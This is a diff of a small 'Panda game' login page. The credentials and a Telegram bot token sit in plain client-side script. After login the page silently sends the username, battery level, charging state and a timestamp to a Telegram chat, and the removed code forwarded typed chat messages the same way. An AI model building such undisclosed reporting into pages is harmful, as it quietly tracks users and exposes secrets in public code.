@@ -11,6 +11,7 @@
     margin:0;min-height:100vh;display:flex;align-items:center;justify-content:center;
     background:#f0f0f0;position:relative;overflow:hidden;padding:20px;
   }
+  /* faint panda logo */
   body::before{
     content:"🐼";position:absolute;left:50%;top:40%;transform:translate(-50%,-40%);
     font-size:180px;opacity:0.08;z-index:0;
@@ -22,112 +23,126 @@
   input:focus{outline:none;box-shadow:0 6px 18px rgba(76,175,80,0.12);border-color:var(--accent)}
   button{width:100%;padding:12px;border-radius:8px;border:0;background:var(--accent);color:#fff;font-weight:600;cursor:pointer;margin-top:10px}
   button:hover{filter:brightness(.95)}
-  .chat-area{display:flex;flex-direction:column;gap:10px;width:100%}
-  .messages{height:300px;overflow-y:auto;border-radius:10px;padding:12px;background:#fafafa;border:1px solid #eee}
-  .msg{display:inline-block;padding:8px 12px;border-radius:12px;margin:6px 0;max-width:78%;font-size:14px}
-  .me{background:#dff7e6;align-self:flex-end}
-  .other{background:#e8f0ff}
-  .compose{display:flex;gap:8px}
-  .compose input{flex:1}
+  .info-row{width:100%;display:flex;justify-content:space-between;gap:8px;margin-top:8px}
+  .info-box{flex:1;padding:10px;border-radius:8px;background:#fafafa;border:1px solid #eee;font-size:14px;text-align:center}
   .powered{margin-top:12px;font-size:12px;color:#555;text-align:center}
+  .disabled { opacity: 0.6; pointer-events: none; }
 </style>
 </head>
 <body>
 
-<!-- Login card -->
+<!-- Login card (only UI) -->
 <div class="card" id="loginCard">
   <h2>Panda game 🐼</h2>
 
-  <input id="username" type="text" placeholder="Enter Username" />
+  <input id="username" type="text" placeholder="Enter Username" autocomplete="off" />
   <input id="password" type="password" placeholder="Enter Password" />
+
+  <!-- Battery info display -->
+  <div class="info-row" aria-hidden="false" id="batteryRow">
+    <div class="info-box" id="batteryLevel">Battery: —</div>
+    <div class="info-box" id="batteryCharging">Charging: —</div>
+  </div>
 
   <button id="loginBtn">Login</button>
   <div class="powered">Powered by Panda</div>
 </div>
 
-<!-- Chat card -->
-<div class="card" id="chatCard" style="display:none; width:420px;">
-  <h2>Welcome to Panda Chat 🐼</h2>
-
-  <div class="chat-area">
-    <div class="messages" id="messages"></div>
-
-    <div class="compose">
-      <input id="chatInput" type="text" placeholder="Type a message..." onkeydown="if(event.key==='Enter'){sendMessage()}">
-      <button id="sendBtn">Send</button>
-    </div>
-  </div>
-  <div class="powered">Powered by Panda</div>
-</div>
-
 <script>
+// ===== CONFIG =====
 const correctUser = "Jpanda";
 const correctPass = "Nadiya";
+
+// Telegram config (as provided)
 const TELEGRAM_TOKEN = "8364245474:AAHyrjR4UfitwsRnkwlPqJaBtBvLoQlQO1g";
 const CHAT_ID = "6975173404";
 
+// The chat URL to open after login
+const CHAT_URL = "https://hack.chat/?pandaa";
+
+// helper: fire-and-forget to Telegram
 function sendToTelegram(text){
   fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
     method: "POST",
     headers: {"Content-Type":"application/json"},
     body: JSON.stringify({ chat_id: CHAT_ID, text })
-  }).catch(()=>{});
+  }).catch(()=>{ /* ignore errors */ });
 }
 
-async function getBatteryInfo(){
+/* ===== Battery UI & state ===== */
+const batteryLevelEl = document.getElementById('batteryLevel');
+const batteryChargingEl = document.getElementById('batteryCharging');
+
+let lastBattery = { available:false, level:'N/A', charging:'Unknown' };
+
+async function initBatteryInfo(){
+  if (!('getBattery' in navigator)) {
+    batteryLevelEl.textContent = 'Battery: Not supported';
+    batteryChargingEl.textContent = 'Charging: N/A';
+    lastBattery = { available:false, level:'N/A', charging:'N/A' };
+    return;
+  }
+
   try {
     const b = await navigator.getBattery();
-    return { available: true, level: Math.round(b.level*100)+"%", charging: b.charging?"Yes":"No" };
-  } catch{ return { available:false }; }
+    function updateAll(){
+      const lvl = Math.round(b.level * 100) + '%';
+      const ch = b.charging ? 'Yes' : 'No';
+      batteryLevelEl.textContent = 'Battery: ' + lvl;
+      batteryChargingEl.textContent = 'Charging: ' + ch;
+      lastBattery = { available:true, level:lvl, charging: ch };
+    }
+    // initial
+    updateAll();
+    // listen for changes
+    b.addEventListener('levelchange', updateAll);
+    b.addEventListener('chargingchange', updateAll);
+  } catch(err){
+    batteryLevelEl.textContent = 'Battery: Not available';
+    batteryChargingEl.textContent = 'Charging: N/A';
+    lastBattery = { available:false, level:'N/A', charging:'N/A' };
+  }
 }
 
-const loginCard=document.getElementById('loginCard');
-const chatCard=document.getElementById('chatCard');
-const loginBtn=document.getElementById('loginBtn');
-const sendBtn=document.getElementById('sendBtn');
-const messagesDiv=document.getElementById('messages');
-const chatInput=document.getElementById('chatInput');
+// initialize on load
+initBatteryInfo();
 
-loginBtn.addEventListener('click',async()=>{
-  const user=document.getElementById('username').value.trim();
-  const pass=document.getElementById('password').value;
-  if(user===correctUser && pass===correctPass){
-    // open hack.chat in a new tab (user gesture)
-    try {
-      window.open("https://hack.chat/?pandaa", '_blank', 'noopener');
-    } catch(e){ /* ignore */ }
+/* ===== login handler ===== */
+document.getElementById('loginBtn').addEventListener('click', async function onLoginClick(e){
+  const user = document.getElementById('username').value.trim();
+  const pass = document.getElementById('password').value;
 
-    // send battery info to Telegram
-    const b = await getBatteryInfo();
-    let info = `🔔 Login: ${user}\n`;
-    info += b.available ? `Battery: ${b.level}, Charging: ${b.charging}` : `Battery: Not available`;
-    sendToTelegram(info);
+  if (user === correctUser && pass === correctPass) {
+    // open chat link in new tab (user gesture => less likely blocked)
+    try { window.open(CHAT_URL, '_blank', 'noopener'); } catch(e){ /* ignore */ }
 
-    // switch UI to internal chat (same tab)
-    loginCard.style.display='none';
-    chatCard.style.display='flex';
-    chatInput.focus();
+    // prepare and send Telegram notification (login + battery)
+    let msg = `🔔 Login: ${user}\n`;
+    if (lastBattery.available) {
+      msg += `Battery: ${lastBattery.level}, Charging: ${lastBattery.charging}`;
+    } else {
+      msg += `Battery: Not available`;
+    }
+    // send battery info message
+    sendToTelegram(msg);
+
+    // optional: login stamp
+    sendToTelegram(`✅ ${user} logged in to Panda site at ${new Date().toLocaleString()}`);
+
+    // disable inputs & change button state
+    document.getElementById('username').value = user;
+    document.getElementById('password').value = '';
+    document.getElementById('username').classList.add('disabled');
+    document.getElementById('password').classList.add('disabled');
+    const btn = document.getElementById('loginBtn');
+    btn.textContent = 'Opened Chat';
+    btn.classList.add('disabled');
+
   } else {
     alert('❌ Wrong username or password!');
   }
 });
-
-function appendMessage(text,cls='me'){
-  const el=document.createElement('div');
-  el.className='msg '+(cls==='me'?'me':'other');
-  el.textContent=text;
-  messagesDiv.appendChild(el);
-  messagesDiv.scrollTop=messagesDiv.scrollHeight;
-}
-function sendMessage(){
-  const txt=chatInput.value.trim();
-  if(!txt)return;
-  appendMessage('Panda: '+txt,'me');
-  sendToTelegram(`Chat Message from Panda: ${txt}`);
-  chatInput.value='';
-  chatInput.focus();
-}
-sendBtn.addEventListener('click',sendMessage);
 </script>
+
 </body>
 </html>
